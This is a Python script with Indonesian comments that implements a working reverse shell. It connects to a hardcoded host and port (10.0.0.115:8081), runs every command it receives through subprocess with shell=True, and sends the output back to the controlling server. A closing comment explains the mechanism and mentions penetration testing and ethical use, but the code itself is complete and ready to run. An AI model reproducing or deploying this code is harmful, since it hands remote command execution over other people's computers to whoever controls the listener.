import socket
# Membuat proses yang berjalan
import subprocess

# Di bawah ini, Anda akan menambahkan IP dan port untuk melakukan koneksi
REMOTE_HOST = '10.0.0.115' # '192.168.43.82'
REMOTE_PORT = 8081 # 2222
# Di sini Anda mengatur soket
client = socket.socket()
print("[-] Menginisialisasi Koneksi...")
# Mengatur koneksi soket ke host dan port yang ditentukan
client.connect((REMOTE_HOST, REMOTE_PORT))
print("[-] Koneksi diinisialisasi!")

# Membuat loop yang benar untuk mengaktifkan shell
while True:
    print("[-] Menunggu perintah...")
    # Mengirim perintah dengan panjang 1024
    command = client.recv(1024)
    # Di sini ia memproses perintah yang didekripsi
    command = command.decode()
    # Di sini ia membuat proses yang membuka prompt perintah atau shell Linux
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    # Keluaran dari perintah
    output = op.stdout.read()
    output_error = op.stderr.read()
    print("[-] Mengirimkan respons...")
    # Mengirim keluaran perintah ke server
    client.send(output + output_error)


# ============================================================================================================ 
# kesimpuan : 
# Skrip tersebut adalah contoh implementasi sederhana dari sebuah *reverse shell* dalam bahasa pemrograman Python. Maksud dan tujuan dari skrip ini adalah untuk membuat koneksi ke komputer target (yang ditentukan oleh `REMOTE_HOST` dan `REMOTE_PORT`), dan kemudian menunggu perintah dari server untuk dieksekusi di komputer target.

# Berikut adalah beberapa komponen utama dari skrip ini:

# 1. **Inisialisasi Koneksi**: Skrip ini menginisialisasi koneksi socket ke host dan port yang ditentukan (`REMOTE_HOST` dan `REMOTE_PORT`).

# 2. **Menunggu Perintah**: Setelah koneksi berhasil dibuat, skrip akan mulai menunggu perintah dari server.

# 3. **Menerima dan Memproses Perintah**: Ketika sebuah perintah diterima dari server, skrip akan memproses perintah tersebut. Perintah didekodekan terlebih dahulu karena pesan yang diterima dari socket biasanya berupa byte.

# 4. **Eksekusi Perintah**: Setelah perintah diterima dan diproses, skrip akan menjalankan perintah tersebut menggunakan modul `subprocess`. Ini memungkinkan skrip untuk menjalankan perintah di shell atau prompt perintah sistem operasi.

# 5. **Mengirimkan Respons**: Setelah perintah dieksekusi, skrip akan menangkap keluaran dari perintah tersebut. Ini termasuk keluaran standar dan keluaran kesalahan. Selanjutnya, skrip akan mengirimkan respons (keluaran dan keluaran kesalahan) kembali ke server.

# Tujuan utama dari skrip ini adalah untuk memberikan kontrol jarak jauh atas komputer target kepada pengguna yang mengontrol server. Dengan menggunakan *reverse shell* seperti ini, pengguna yang mengontrol server dapat menjalankan perintah di komputer target tanpa harus memiliki akses langsung ke sana. Ini dapat digunakan untuk administrasi jarak jauh, pengujian penetrasi, atau bahkan untuk kegiatan yang tidak etis jika digunakan dengan cara yang tidak pantas. Oleh karena itu, penting untuk menggunakan teknologi ini dengan etika dan kehati-hatian yang tepat.
